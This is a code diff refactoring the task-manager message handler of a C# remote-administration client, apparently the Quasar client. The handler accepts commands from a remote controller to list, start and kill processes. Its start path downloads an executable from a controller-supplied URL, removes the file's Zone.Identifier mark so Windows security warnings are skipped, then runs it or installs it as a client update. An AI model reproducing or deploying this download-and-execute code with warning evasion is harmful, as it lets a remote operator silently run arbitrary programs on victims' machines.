@@ -6,28 +6,46 @@ using Quasar.Common.Helpers;
 using Quasar.Common.Messages;
 using Quasar.Common.Networking;
 using System;
+using System.ComponentModel;
 using System.Diagnostics;
 using System.Net;
 using System.Threading;
 
 namespace Quasar.Client.Messages
 {
-    public class TaskManagerHandler : MessageProcessorBase<object>
+    /// <summary>
+    /// Handles messages for the interaction with tasks.
+    /// </summary>
+    public class TaskManagerHandler : IMessageProcessor
     {
         private readonly QuasarClient _client;
 
-        public TaskManagerHandler(QuasarClient client) : base(false)
+        private readonly WebClient _webClient;
+
+        public TaskManagerHandler(QuasarClient client)
         {
             _client = client;
+            _client.ClientState += OnClientStateChange;
+            _webClient = new WebClient { Proxy = null };
+            _webClient.DownloadFileCompleted += OnDownloadFileCompleted;
         }
 
-        public override bool CanExecute(IMessage message) => message is GetProcesses ||
+        private void OnClientStateChange(Networking.Client s, bool connected)
+        {
+            if (!connected)
+            {
+                if (_webClient.IsBusy)
+                    _webClient.CancelAsync();
+            }
+        }
+
+        public bool CanExecute(IMessage message) => message is GetProcesses ||
                                                              message is DoProcessStart ||
                                                              message is DoProcessEnd;
 
-        public override bool CanExecuteFrom(ISender sender) => true;
+        public bool CanExecuteFrom(ISender sender) => true;
 
-        public override void Execute(ISender sender, IMessage message)
+        public void Execute(ISender sender, IMessage message)
         {
             switch (message)
             {
@@ -64,72 +82,90 @@ namespace Quasar.Client.Messages
 
         private void Execute(ISender client, DoProcessStart message)
         {
-            new Thread(() =>
+            if (string.IsNullOrEmpty(message.FilePath))
             {
-                string filePath = message.FilePath;
-
-                if (string.IsNullOrEmpty(filePath))
+                // download and then execute
+                if (string.IsNullOrEmpty(message.DownloadUrl))
                 {
-                    if (string.IsNullOrEmpty(message.DownloadUrl))
-                    {
-                        client.Send(new DoProcessResponse { Action = ProcessAction.Start, Result = false });
-                        return;
-                    }
+                    client.Send(new DoProcessResponse {Action = ProcessAction.Start, Result = false});
+                    return;
+                }
 
-                    filePath = FileHelper.GetTempFilePath(".exe");
+                message.FilePath = FileHelper.GetTempFilePath(".exe");
 
-                    // download first
-                    try
+                try
+                {
+                    if (_webClient.IsBusy)
                     {
-                        using (WebClient c = new WebClient())
+                        _webClient.CancelAsync();
+                        while (_webClient.IsBusy)
                         {
-                            c.Proxy = null;
-                            c.DownloadFile(message.DownloadUrl, filePath);
+                            Thread.Sleep(50);
                         }
+                    }
 
-                        FileHelper.DeleteZoneIdentifier(filePath);
-                    }
-                    catch
-                    {
-                        client.Send(new DoProcessResponse { Action = ProcessAction.Start, Result = false });
-                        NativeMethods.DeleteFile(filePath);
-                        return;
-                    }
+                    _webClient.DownloadFileAsync(new Uri(message.DownloadUrl), message.FilePath, message);
                 }
-
-                if (message.IsUpdate)
+                catch
                 {
-                    try
-                    {
-                        var clientUpdater = new ClientUpdater();
-                        clientUpdater.Update(filePath); 
-                        _client.Exit();
-                    }
-                    catch (Exception ex)
-                    {
-                        NativeMethods.DeleteFile(filePath);
-                        client.Send(new SetStatus { Message = $"Update failed: {ex.Message}" });
-                    }
+                    client.Send(new DoProcessResponse {Action = ProcessAction.Start, Result = false});
+                    NativeMethods.DeleteFile(message.FilePath);
                 }
-                else
-                {
-                    try
-                    {
-                        ProcessStartInfo startInfo = new ProcessStartInfo
-                        {
-                            UseShellExecute = true,
-                            FileName = filePath
-                        };
-                        Process.Start(startInfo);
-                        client.Send(new DoProcessResponse {Action = ProcessAction.Start, Result = true});
-                    }
-                    catch (Exception)
-                    {
-                        client.Send(new DoProcessResponse {Action = ProcessAction.Start, Result = false});
-                    }
+            }
+            else
+            {
+                // execute locally
+                ExecuteProcess(message.FilePath, message.IsUpdate);
+            }
+        }
 
+        private void OnDownloadFileCompleted(object sender, AsyncCompletedEventArgs e)
+        {
+            var message = (DoProcessStart) e.UserState;
+            if (e.Cancelled)
+            {
+                NativeMethods.DeleteFile(message.FilePath);
+                return;
+            }
+
+            FileHelper.DeleteZoneIdentifier(message.FilePath);
+            ExecuteProcess(message.FilePath, message.IsUpdate);
+        }
+
+        private void ExecuteProcess(string filePath, bool isUpdate)
+        {
+            if (isUpdate)
+            {
+                try
+                {
+                    var clientUpdater = new ClientUpdater();
+                    clientUpdater.Update(filePath);
+                    _client.Exit();
                 }
-            }).Start();
+                catch (Exception ex)
+                {
+                    NativeMethods.DeleteFile(filePath);
+                    _client.Send(new SetStatus { Message = $"Update failed: {ex.Message}" });
+                }
+            }
+            else
+            {
+                try
+                {
+                    ProcessStartInfo startInfo = new ProcessStartInfo
+                    {
+                        UseShellExecute = true,
+                        FileName = filePath
+                    };
+                    Process.Start(startInfo);
+                    _client.Send(new DoProcessResponse { Action = ProcessAction.Start, Result = true });
+                }
+                catch (Exception)
+                {
+                    _client.Send(new DoProcessResponse { Action = ProcessAction.Start, Result = false });
+                }
+
+            }
         }
 
         private void Execute(ISender client, DoProcessEnd message)
@@ -145,9 +181,24 @@ namespace Quasar.Client.Messages
             }
         }
 
-        protected override void Dispose(bool disposing)
+        /// <summary>
+        /// Disposes all managed and unmanaged resources associated with this message processor.
+        /// </summary>
+        public void Dispose()
         {
-            
+            Dispose(true);
+            GC.SuppressFinalize(this);
+        }
+
+        protected virtual void Dispose(bool disposing)
+        {
+            if (disposing)
+            {
+                _client.ClientState -= OnClientStateChange;
+                _webClient.DownloadFileCompleted -= OnDownloadFileCompleted;
+                _webClient.CancelAsync();
+                _webClient.Dispose();
+            }
         }
     }
 }
